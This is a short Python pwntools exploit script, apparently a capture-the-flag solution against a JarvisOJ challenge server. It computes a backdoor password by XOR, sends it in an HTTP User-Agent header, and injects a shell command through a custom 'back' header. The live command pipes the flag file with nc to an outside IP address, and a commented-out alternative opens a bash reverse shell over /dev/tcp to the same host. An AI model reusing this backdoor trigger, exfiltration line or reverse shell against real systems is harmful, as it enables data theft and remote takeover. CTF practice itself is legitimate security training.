#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
#context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

io = remote("pwn.jarvisoj.com", 9881)
# io = remote('127.0.0.1', 1807)
def get_pwd():
    idx = 0
    pwd = ""
    for i in "2016CCRT":
        pwd += chr(ord(i) ^ idx)
        idx += 1
    return pwd

def get_http(pwd, cmd):
    payload = "GET / HTTP/1.1\r\n"
    payload += "User-Agent: {}\r\n".format(pwd)
    payload += "back: {}\r\n".format(cmd)
    payload += "\r\n\r\n"
    return payload

if __name__ == '__main__':
    pwd = get_pwd()
    cmd = "cat flag | nc 157.230.160.245 9999;"
    # cmd = "bash -c 'sh -i >& /dev/tcp/157.230.160.245/9999 0>&1';"
    io.sendline(get_http(pwd, cmd))
    io.close()
